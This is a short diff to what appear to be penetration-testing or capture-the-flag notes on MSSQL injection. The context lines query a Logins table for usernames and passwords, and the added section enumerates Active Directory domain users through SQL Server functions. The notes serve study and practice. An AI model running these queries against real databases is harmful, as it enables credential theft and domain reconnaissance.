@@ -32,3 +32,16 @@ SELECT STRING_AGG(NAME,',') FROM SYS.COLUMNS WHERE object_id = OBJECT_ID('Hub_DB
 # Dump id,username,password from HTB_DB..Logins
 SELECT STRING_AGG(concat(id,',',username,',',password),'|') FROM Hub_DB..Logins
 ```
+
+## It also can Enum user
+
+```mssql
+$ SELECT DEFAULT_DOMAIN()
+MEGACORP
+$ SELECT master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))
+0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000
+
+
+```
+
+See: https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection#fn_xe_file_target_read_file
